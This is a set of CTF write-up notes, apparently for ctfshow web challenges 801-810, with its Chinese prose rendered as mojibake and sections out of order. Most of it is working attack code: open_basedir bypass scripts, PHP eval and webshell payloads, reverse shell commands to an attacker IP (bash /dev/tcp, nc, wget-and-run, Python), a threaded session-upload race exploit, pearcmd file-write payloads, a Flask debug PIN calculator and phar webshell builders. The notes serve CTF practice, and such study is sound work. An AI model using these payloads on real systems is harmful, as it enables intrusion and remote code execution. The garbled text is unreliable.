åŸºæœ¬åŸç†æ˜¯åŸºäºæŠ¥é”™è¿”å›å†…å®¹çš„ä¸ç”¨ï¼Œè®¾ç½®è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°ï¼Œå¾ªç¯éå†åŒ¹é…åˆ°æ­£åˆ™çš„æŠ¥é”™ä¿¡æ¯çš„å­—ç¬¦æ¥é€ä¸ªæ‹¼æ¥æˆå­˜åœ¨çš„æ–‡ä»¶åï¼Œå¦å¤–æ˜¯éœ€è¦ç»“åˆåˆ©ç”¨Windowsä¸‹çš„ä¸¤ä¸ªç‰¹æ®Šçš„é€šé…ç¬¦<å’Œ>ï¼Œä¸ç„¶åªèƒ½è¿›è¡Œæš´ç ´ã€‚\n\n   ```php\n   <?php\n   ini_set('open_basedir', dirname(__FILE__));\n   printf(\"<b>open_basedir: %s</b><br />\", ini_get('open_basedir'));\n   set_error_handler('isexists');\n   $dir = 'E:/wamp64/';\n   $file = '';\n   $chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';\n   for ($i=0; $i < strlen($chars); $i++) {\n           $file = $dir . $chars[$i] . '<><';\n           realpath($file);\n   }\n   function isexists($errno, $errstr)\n   {\n           $regexp = '/File\\((.*)\\) is not within/';\n           preg_match($regexp, $errstr, $matches);\n           if (isset($matches[1])) {\n                   printf(\"%s <br/>\", $matches[1]);\n           }\n   }\n   ?>\n   ```\n\n   å¯ä»¥çœ‹åˆ°ï¼Œé¦–å­—æ¯ä¸åŒçš„æ–‡ä»¶å°±è¢«åˆ—å‡ºæ¥äº†ï¼Œé¦–å­—æ¯ç›¸åŒçš„æ–‡ä»¶ä¸­åªåˆ—äº†ç¬¬ä¸€ä¸ªï¼š\n\n   ![](https://www.mi1k7ea.com/2019/07/20/æµ…è°ˆå‡ ç§Bypass-open-basedirçš„æ–¹æ³•/10.png)\n\næœ€åæ˜¯å¤§ä½¬è„šæœ¬\n\n```php\n<?php\n/*\n* by phithon\n* From https://www.leavesongs.com\n* detail: http://cxsecurity.com/issue/WLB-2009110068\n*/\nheader('content-type: text/plain');\nerror_reporting(-1);\nini_set('display_errors', TRUE);\nprintf(\"open_basedir: %s\\nphp_version: %s\\n\", ini_get('open_basedir'), phpversion());\nprintf(\"disable_functions: %s\\n\", ini_get('disable_functions'));\n$file = str_replace('\\\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');\n$relat_file = getRelativePath(__FILE__, $file);\n$paths = explode('/', $file);\n$name = mt_rand() % 999;\n$exp = getRandStr();\nmkdir($name);\nchdir($name);\nfor($i = 1 ; $i < count($paths) - 1 ; $i++){\n    mkdir($paths[$i]);\n    chdir($paths[$i]);\n}\nmkdir($paths[$i]);\nfor ($i -= 1; $i > 0; $i--) { \n    chdir('..');\n}\n$paths = explode('/', $relat_file);\n$j = 0;\nfor ($i = 0; $paths[$i] == '..'; $i++) { \n    mkdir($name);\n    chdir($name);\n    $j++;\n}\nfor ($i = 0; $i <= $j; $i++) { \n    chdir('..');\n}\n$tmp = array_fill(0, $j + 1, $name);\nsymlink(implode('/', $tmp), 'tmplink');\n$tmp = array_fill(0, $j, '..');\nsymlink('tmplink/' . implode('/', $tmp) . $file, $exp);\nunlink('tmplink');\nmkdir('tmplink');\ndelfile($name);\n$exp = dirname($_SERVER['SCRIPT_NAME']) . \"/{$exp}\";\n$exp = \"http://{$_SERVER['SERVER_NAME']}{$exp}\";\necho \"\\n-----------------content---------------\\n\\n\";\necho file_get_contents($exp);\ndelfile('tmplink');\n\nfunction getRelativePath($from, $to) {\n  // some compatibility fixes for Windows paths\n  $from = rtrim($from, '\\/') . '/';\n  $from = str_replace('\\\\', '/', $from);\n  $to   = str_replace('\\\\', '/', $to);\n\n  $from   = explode('/', $from);\n  $to     = explode('/', $to);\n  $relPath  = $to;\n\n  foreach($from as $depth => $dir) {\n    // find first non-matching dir\n    if($dir === $to[$depth]) {\n      // ignore this directory\n      array_shift($relPath);\n    } else {\n      // get number of remaining dirs to $from\n      $remaining = count($from) - $depth;\n      if($remaining > 1) {\n        // add traversals up to first matching dir\n        $padLength = (count($relPath) + $remaining - 1) * -1;\n        $relPath = array_pad($relPath, $padLength, '..');\n        break;\n      } else {\n        $relPath[0] = './' . $relPath[0];\n      }\n    }\n  }\n  return implode('/', $relPath);\n}\n\nfunction delfile($deldir){\n    if (@is_file($deldir)) {\n        @chmod($deldir,0777);\n        return @unlink($deldir);\n    }else if(@is_dir($deldir)){\n        if(($mydir = @opendir($deldir)) == NULL) return false;\n        while(false !== ($file = @readdir($mydir)))\n        {\n            $name = File_Str($deldir.'/'.$file);\n            if(($file!='.') && ($file!='..')){delfile($name);}\n        } \n        @closedir($mydir);\n        @chmod($deldir,0777);\n        return @rmdir($deldir) ? true : false;\n    }\n}\n\nfunction File_Str($string)\n{\n    return str_replace('//','/',str_replace('\\\\','/',$string));\n}\n\nfunction getRandStr($length = 6) {\n    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $randStr = '';\n    for ($i = 0; $i < $length; $i++) {\n        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);\n    }\n    return $randStr;\n}\n```\n\nincludeè¿œç¨‹æ–‡ä»¶åä¼ å‚fileå³å¯\n\n**806**\n\n### phpæ— å‚RCE\n\né¦–å…ˆæ˜¯ä¸€ç¯‡å¯ä¾›å‚è€ƒçš„[æ–‡ç« ](https://blog.csdn.net/qq_45570082/article/details/106602261)\n\nåˆ©ç”¨æ–¹å¼æœ‰ä»¥ä¸‹å‡ ç§\n\n1. **åˆ©ç”¨session_id**\n\n   phpä¸­æœ‰ä¸€ä¸ªå‡½æ•°å«session_id(),å¯ä»¥ç›´æ¥è·å–åˆ°cookieä¸­çš„phpsessionidå€¼ï¼Œphpsessionidçš„ç»„æˆç¬¦å·æœ‰é™å®š,ä¸èƒ½ä½¿ç”¨ â€™ () 'ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤è½¬æ¢æˆ16è¿›åˆ¶ï¼Œç„¶åå†é€šè¿‡hex2binå‡½æ•°è½¬æ¢å›å»ï¼Œ`bin2hex('payload');`æ¥è½¬æ¢16ç¦æ­¢ï¼Œåœ¨ä½¿ç”¨æ—¶é€šè¿‡`eval(hex2bin(session_id(session_start())));`ï¼Œåœ¨åŠ ä¸Šè¯·æ±‚å¤´ä¸­Cookieä¸­çš„`PHPSESSID=16è¿›åˆ¶payload`æ‰§è¡Œ\n\n2. **åˆ©ç”¨`get_defined_vars ()`å‡½æ•°**\n\n   `get_defined_vars()`ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„\n\n   å¯ä¾›åˆ©ç”¨çš„å‡½æ•°\n\n   ```php\n   end() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\n   next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\n   prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\n   reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚\n   each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚\n   ```\n\n   å¯ä»¥çœ‹åˆ°åœ¨å·²å®šä¹‰çš„å˜é‡ä¸­å­˜åœ¨ç€å…¨å±€å˜é‡GETå’ŒPOSTï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥å‚æ•°æ¥å®ç°RCE\n\n   ```\n   payload:?a=eval(end(current(get_defined_vars())));&b=phpinfo();\n   ```\n\n3. æ–‡ä»¶è¯»å–\n\n   å¯ä¾›åˆ©ç”¨çš„å‡½æ•°\n\n   ```\n   var_dump()  æ‰“å°æ‰€æœ‰å†…å®¹\n   print_r()  åŒä¸Š\n   scandir()  æ‰«æè·¯å¾„å†…æ–‡ä»¶åå¹¶è¿”å›ä¸€ä¸ªè¿­ä»£å™¨\n   localeconv()  \n   getcwd()  è·å¾—å½“å‰å·¥ä½œç›®å½•\n   getallheaders()  è·å¾—è¯·æ±‚å¤´å†…å®¹\n   \n   ```\n\n   \n\n\n\n\n\n\n\n\n\n\n\n\n\n**807**\n\n### åå¼¹shell\n\næœ¬åœ°ç›‘å¬ç«¯å£ï¼Œè®°ä½è¦æœ‰å…¬ç½‘IPï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨frpå†…ç½‘ç©¿é€\n\n1. å…¬ç½‘æœåŠ¡å™¨\n\n   ç›‘å¬å‘½ä»¤\n\n   ```\n   æ”»å‡»ç«¯\n   nc -lvp ç›‘å¬çš„ç«¯å£\n   å—å®³ç«¯\n   bash -i >& /dev/tcp/æ”»å‡»ç«¯IP/æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 0>&1\n   nc æ”»å‡»ç«¯IP æ”»å‡»ç«¯ç›‘å¬ç«¯å£ -t /bin/bash\n   ```\n\n   åˆ©ç”¨wgetä¸‹è½½æ‰§è¡Œ\n\n   ```\n   wget æ”»å‡»ç«¯IP/shell.txt -O /tmp/shell.php && php /tmp/shell.php\n   ```\n\n   pythonè„šæœ¬åå¼¹\n\n   ```python\n   #!/usr/bin/python\n   #-*- coding: utf-8 -*-\n   import socket,subprocess,os\n   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n   s.connect((\"æ”»å‡»ç«¯IP\",æ”»å‡»ç«¯ç›‘å¬ç«¯å£)) #æ›´æ”¹localhostä¸ºâ¾ƒâ¼°çš„å¤–â½¹ip,ç«¯â¼ä»»æ„\n   os.dup2(s.fileno(),0)\n   os.dup2(s.fileno(),1)\n   os.dup2(s.fileno(),2)\n   p=subprocess.call([\"/bin/sh\",\"-i\"])\n   \n   ```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**808**\n\n### å¡ä¸´æ—¶æ–‡ä»¶åŒ…å«\n\n```python\nimport requests\nimport threading\nimport sys\nsession=requests.session()\nsess='yu22x'\nurl1=\"http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/\"\nurl2='http://97ccc0d8-b608-44a0-970b-895263a76d15.challenge.ctf.show/?file=/tmp/sess_yu22x'\ndata1={\n    'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'\n}\ndata2={\n    '1':'echo 11123;system(\"cat /*\");',\n}\nfile={\n    'file':'1'\n}\ncookies={\n    'PHPSESSID': sess\n}\ndef write():\n    while True:\n        r = session.post(url1,data=data1,files=file,cookies=cookies)\ndef read():\n    while True:\n        r = session.post(url2,data=data2)\n        if '11123' in r.text:\n            print(r.text)\n\nif __name__==\"__main__\":\n    event=threading.Event()\n    with requests.session() as session:\n        for i in range(1,30): \n            threading.Thread(target=write).start()\n        for i in range(1,30):\n            threading.Thread(target=read).start()\n    event.set()\n```\n\nçº¯çº¯çœ‹è¿æ°”\n\n**809**\n\n### pearæ–‡ä»¶åŒ…å«/RCE\n\næ–‡ç« [åœ¨æ­¤](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)\n\n> peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š`--with-pear`æ‰ä¼šå®‰è£…ã€‚\n>\n> ä¸è¿‡ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨`/usr/local/lib/php`ã€‚\n>\n> åŸæœ¬pear/pcelæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¹¶ä¸åœ¨Webç›®å½•ä¸‹ï¼Œå³ä½¿å­˜åœ¨ä¸€äº›å®‰å…¨éšæ‚£ä¹Ÿæ— éœ€æ‹…å¿ƒã€‚ä½†æˆ‘ä»¬é‡åˆ°çš„åœºæ™¯æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„åœºæ™¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŒ…å«åˆ°pearä¸­çš„æ–‡ä»¶ï¼Œè¿›è€Œåˆ©ç”¨å…¶ä¸­çš„ç‰¹æ€§æ¥æäº‹ã€‚\n>\n> æˆ‘æœ€æ—©çš„æ—¶å€™æ˜¯åœ¨é˜…è¯»phpinfo()çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°Dockerç¯å¢ƒä¸‹çš„PHPä¼šå¼€å¯`register_argc_argv`è¿™ä¸ªé…ç½®ã€‚æ–‡æ¡£ä¸­å¯¹è¿™ä¸ªé€‰é¡¹çš„ä»‹ç»ä¸æ˜¯ç‰¹åˆ«æ¸…æ¥šï¼Œå¤§æ¦‚çš„æ„æ€æ˜¯ï¼Œå½“å¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œç”¨æˆ·çš„è¾“å…¥å°†ä¼šè¢«èµ‹äºˆç»™`$argc`ã€`$argv`ã€`$_SERVER['argv']`å‡ ä¸ªå˜é‡ã€‚\n>\n> å¦‚æœPHPä»¥å‘½ä»¤è¡Œçš„å½¢å¼è¿è¡Œï¼ˆå³sapiæ˜¯cliï¼‰ï¼Œè¿™é‡Œå¾ˆå¥½ç†è§£ã€‚ä½†å¦‚æœPHPä»¥Serverçš„å½¢å¼è¿è¡Œï¼Œä¸”åˆå¼€å¯äº†`register_argc_argv`ï¼Œé‚£ä¹ˆè¿™å…¶ä¸­æ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Ÿ\n>\n> HTTPæ•°æ®åŒ…ä¸­çš„query-stringä¼šè¢«ä½œä¸ºargvçš„å€¼\n\næœ€ç»ˆæ„é€ çš„payloadå¦‚ä¸‹\n\n```\n?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php\n```\n\næ­¤æ—¶/tmp/hello.phpæ–‡ä»¶ä¸­å°±æœ‰äº†æˆ‘ä»¬å†™å…¥çš„`<?=phpinfo()?>`ï¼Œæ–‡ä»¶åŒ…å«å³å¯\n\n**810**\n\n### SSRFæ‰“PHP-FPM\n\næœ‰å·¥å…·ä¸ç”¨***\n\n```\ntitle: CTFshowå¸¸ç”¨å§¿åŠ¿\ndate: 2022-06-04 16:20:22\ntags:\n```\n\n**801**\n\n### flaskè®¡ç®—PIN\n\n**ä»€ä¹ˆæ˜¯PINç **\n\nPINç ä¹Ÿå°±æ˜¯flaskåœ¨å¼€å¯debugæ¨¡å¼ä¸‹ï¼Œè¿›è¡Œä»£ç è°ƒè¯•æ¨¡å¼çš„è¿›å…¥å¯†ç ï¼Œéœ€è¦æ­£ç¡®çš„PINç æ‰èƒ½è¿›å…¥è°ƒè¯•æ¨¡å¼\n\n**æ³¨æ„äº‹é¡¹ï¼šè°¨è®°ï¼ï¼python 3.8ï¼ˆmd5ï¼‰å’Œ3.6ï¼ˆsha1ï¼‰pinç ç”Ÿæˆæ–¹å¼ä¸åŒ**\n\n**ä½¿ç”¨æ¡ä»¶ï¼šflask debugæ¨¡å¼å¼€å¯ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–**\n\né¦–å…ˆæ˜¯python PINç çš„ç”Ÿæˆè„šæœ¬\n\n```\n#ç”Ÿæ•ˆæ—¶é—´ä¸ºä¸€å‘¨\nPIN_TIME = 60 * 60 * 24 * 7\n\n\ndef hash_pin(pin: str) -> str:\n    return hashlib.sha1(f\"{pin} added salt\".encode(\"utf-8\", \"replace\")).hexdigest()[:12]\n\n\n_machine_id: t.Optional[t.Union[str, bytes]] = None\n\n#è·å–æœºå™¨å·\ndef get_machine_id() -> t.Optional[t.Union[str, bytes]]:\n    global _machine_id\n\n    if _machine_id is not None:\n        return _machine_id\n\n    def _generate() -> t.Optional[t.Union[str, bytes]]:\n        linux = b\"\"\n\n        # machine-id is stable across boots, boot_id is not.\n        for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\":\n            try:\n                with open(filename, \"rb\") as f:\n                    value = f.readline().strip()\n            except OSError:\n                continue\n\n            if value:\n            #è¯»å–æ–‡ä»¶è¿›è¡Œæ‹¼æ¥\n                linux += value\n                break\n\n        # Containers share the same machine id, add some cgroup\n        # information. This is used outside containers too but should be\n        # relatively stable across boots.\n        try:\n            with open(\"/proc/self/cgroup\", \"rb\") as f:\n            #ç»§ç»­è¿›è¡Œæ‹¼æ¥ï¼Œè¿™é‡Œå¤„ç†ä¸€ä¸‹åªè¦/dockeråçš„ä¸œè¥¿\n                linux += f.readline().strip().rpartition(b\"/\")[2]\n        except OSError:\n            pass\n\n        if linux:\n            return linux\n\n        # On OS X, use ioreg to get the computer's serial number.\n        try:\n            # subprocess may not be available, e.g. Google App Engine\n            # https://github.com/pallets/werkzeug/issues/925\n            from subprocess import Popen, PIPE\n\n            dump = Popen(\n                [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE\n            ).communicate()[0]\n            match = re.search(b'\"serial-number\" = <([^>]+)', dump)\n\n            if match is not None:\n                return match.group(1)\n        except (OSError, ImportError):\n            pass\n\n        # On Windows, use winreg to get the machine guid.\n        if sys.platform == \"win32\":\n            import winreg\n\n            try:\n                with winreg.OpenKey(\n                    winreg.HKEY_LOCAL_MACHINE,\n                    \"SOFTWARE\\\\Microsoft\\\\Cryptography\",\n                    0,\n                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,\n                ) as rk:\n                    guid: t.Union[str, bytes]\n                    guid_type: int\n                    guid, guid_type = winreg.QueryValueEx(rk, \"MachineGuid\")\n\n                    if guid_type == winreg.REG_SZ:\n                        return guid.encode(\"utf-8\")\n\n                    return guid\n            except OSError:\n                pass\n\n        return None\n\n    _machine_id = _generate()\n    return _machine_id\n\n\nclass _ConsoleFrame:\n    \"\"\"Helper class so that we can reuse the frame console code for the\n    standalone console.\n    \"\"\"\n\n    def __init__(self, namespace: t.Dict[str, t.Any]):\n        self.console = Console(namespace)\n        self.id = 0\n\n\ndef get_pin_and_cookie_name(\n    app: \"WSGIApplication\",\n) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:\n    \"\"\"Given an application object this returns a semi-stable 9 digit pin\n    code and a random key.  The hope is that this is stable between\n    restarts to not make debugging particularly frustrating.  If the pin\n    was forcefully disabled this returns `None`.\n\n    Second item in the resulting tuple is the cookie name for remembering.\n    \"\"\"\n    pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\")\n    rv = None\n    num = None\n\n    # Pin was explicitly disabled\n    if pin == \"off\":\n        return None, None\n\n    # Pin was provided explicitly\n    if pin is not None and pin.replace(\"-\", \"\").isdigit():\n        # If there are separators in the pin, return it directly\n        if \"-\" in pin:\n            rv = pin\n        else:\n            num = pin\n\n    modname = getattr(app, \"__module__\", t.cast(object, app).__class__.__module__)\n    username: t.Optional[str]\n\n    try:\n        # getuser imports the pwd module, which does not exist in Google\n        # App Engine. It may also raise a KeyError if the UID does not\n        # have a username, such as in Docker.\n        username = getpass.getuser()\n    except (ImportError, KeyError):\n        username = None\n\n    mod = sys.modules.get(modname)\n\n    # This information only exists to make the cookie unique on the\n    # computer, not as a security feature.\n    probably_public_bits = [\n        username,\n        modname,\n        getattr(app, \"__name__\", type(app).__name__),\n        getattr(mod, \"__file__\", None),\n    ]\n\n    # This information is here to make it harder for an attacker to\n    # guess the cookie name.  They are unlikely to be contained anywhere\n    # within the unauthenticated debug page.\n    private_bits = [str(uuid.getnode()), get_machine_id()]\n\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, str):\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n\n    cookie_name = f\"__wzd{h.hexdigest()[:20]}\"\n\n    # If we need to generate a pin we salt it a bit more so that we don't\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"{int(h.hexdigest(), 16):09d}\"[:9]\n\n    # Format the pincode in groups of digits for easier remembering if\n    # we don't have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n\n    return rv, cookie_name\n```\n\nç”±ä¸Šå¯ä»¥çœ‹å¾—å‡ºPINå€¼ç”Ÿæˆæ‰€éœ€è¦è·å–çš„æ•°æ®æœ‰\n\n- usernameï¼Œç”¨æˆ·å\n- modnameï¼Œé»˜è®¤å€¼ä¸ºflask.app\n- appnameï¼Œé»˜è®¤å€¼ä¸ºFlask\n- moddirï¼Œflaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„\n- uuidnodeï¼Œå½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°\n- machine_idï¼Œdockeræœºå™¨idæˆ–æœ¬æœºid\n\né¦–å…ˆæ˜¯ç”¨æˆ·å\n\n![img](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png)\n\nå¯ç”¨çš„ä¼¼ä¹åªæœ‰root\n\nä¸‹é¢ä¸‰é¡¹ä»»æ„æŠ¥é”™å³å¯è·å¾—\n\nmacåœ°å€\n\n![img](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png)\n\nMachine_id\n\n![img](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png)\n\næœ¬æœºç”Ÿæˆè„šæœ¬å¦‚ä¸‹\n\n```\n#MD5\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n     'flaskweb'# username\n     'flask.app',# modname\n     'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n     '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n     '25214234362297',# str(uuid.getnode()),  /sys/class/net/ens33/address\n     '0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'# get_machine_id(), /etc/machine-id\n]\n\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n   h.update(b'pinsalt')\n   num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n   for group_size in 5, 4, 3:\n       if len(num) % group_size == 0:\n          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                      for x in range(0, len(num), group_size))\n          break\n       else:\n          rv = num\n\nprint(rv)\n#sha1\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'root'# /etc/passwd\n    'flask.app',# é»˜è®¤å€¼\n    'Flask',# é»˜è®¤å€¼\n    '/usr/local/lib/python3.8/site-packages/flask/app.py' # æŠ¥é”™å¾—åˆ°\n]\n\nprivate_bits = [\n    '2485377581187',#  /sys/class/net/eth0/address 16è¿›åˆ¶è½¬10è¿›åˆ¶\n    #machine_idç”±ä¸‰ä¸ªåˆå¹¶(dockerå°±åä¸¤ä¸ª)ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup\n    '653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'#  /proc/self/cgroup\n]\n\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\nä½¿ç”¨æœ€ç»ˆç”Ÿæˆçš„PINè¿›å…¥ä»£ç è°ƒè¯•ï¼ŒRCE\n\n**802**\n\n### æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ\n\nå¼‚æˆ–æ³•ï¼Œå·ä¸ªè„šæœ¬å–µå–µ\n\n```\n<?php\n\n/*author yu22x*/\n\n$myfile = fopen(\"xor_rce.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) {\n    for ($j=0; $j <256 ; $j++) {\n\n        if($i<16){\n            $hex_i='0'.dechex($i);\n        }\n        else{\n            $hex_i=dechex($i);\n        }\n        if($j<16){\n            $hex_j='0'.dechex($j);\n        }\n        else{\n            $hex_j=dechex($j);\n        }\n        $preg = '/[a-z0-9]/i'; //æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n            echo \"\";\n        }\n\n        else{\n            $a='%'.$hex_i;\n            $b='%'.$hex_j;\n            $c=(urldecode($a)^urldecode($b));\n            if (ord($c)>=32&ord($c)<=126) {\n                $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n            }\n        }\n\n    }\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n\n# -*- coding: utf-8 -*-\n\n# author yu22x\n\nimport requests\nimport urllib\nfrom sys import *\nimport os\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"xor_rce.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your functionï¼š\") )+action(input(\"[+] your commandï¼š\"))+\";\"\n   print(param)\n```\n\n**803**\n\n### pharæ–‡ä»¶åŒ…å«\n\næ¥è‡ªå¤§ä½¬çš„æç¤ºï¼šæŠŠpharå½“å‹ç¼©åŒ…ç”¨å°±è¡Œ\n\né¦–å…ˆç”ŸæˆåŒ…å«ä¸€å¥è¯æœ¨é©¬çš„pharæ–‡ä»¶\n\n```\n<?php\n$phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar\n$phar->startBuffering();\n$phar->setStub('<?php __HALT_COMPILER(); ?>'); //è®¾ç½®stub\n$phar->addFromString('test.txt', '<?php system($_POST[a]);?>'); //\n$phar->stopBuffering();\n// pharç”Ÿæˆ\n?>\n```\n\næ­¤æ—¶pharåŒ…ä¸­çš„test.txtä¸­çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬äº†\n\nä¸Šä¼ æ–‡ä»¶ï¼ˆè®°å¾—è¯»å–ç„¶åurlç¼–ç ä¸€ä¸‹ï¼‰\n\n```\npayload:?file=/tmp/phar.phar&content=%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB\n```\n\nincludeå¹²\n\n![æˆªå±2022-06-06 20.00.48](file:///Users/jlan/Library/Application%20Support/typora-user-images/%E6%88%AA%E5%B1%8F2022-06-06%2020.00.48.png?lastModify=1654679483)\n\n**804**\n\n### pharååºåˆ—åŒ–\n\nè¿™ä¸ç”¨æ•™å§\n\n```\n<?php\nclass hacker{\n    public $code;\n}\n\n// @unlink(\"phar.phar\");\n$phar = new Phar(\"phar.phar\"); //åç¼€åå¿…é¡»ä¸ºphar\n// $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ); //å‹ç¼©è§„é¿æ•æ„Ÿå­—ç¬¦\n$phar->startBuffering();\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //è®¾ç½®stub\n$o = new hacker();\n$o->code=\"highlight_file('flag.php');\";\n$phar->setMetadata($o); 